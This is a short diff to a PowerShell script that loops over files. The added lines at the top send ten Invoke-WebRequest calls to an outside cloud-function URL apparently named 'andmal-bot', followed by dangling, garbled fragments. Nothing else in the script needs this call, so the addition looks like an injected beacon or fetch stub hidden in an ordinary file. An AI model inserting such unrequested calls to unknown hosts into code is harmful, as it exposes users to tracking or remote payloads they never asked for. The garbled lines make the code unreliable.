@@ -1,3 +1,9 @@
+ for ($num = 1 ; $num -le 10 ; $num++){  Invoke-WebRequest https://us-central1-andmal-bot.cloudfunctions.net/dotnet2 }
+ 
+#  
+1..10 | 
+# 
+
 foreach ($file in { Get-Item * })
 {
     # When find succeeds, the loop breaks
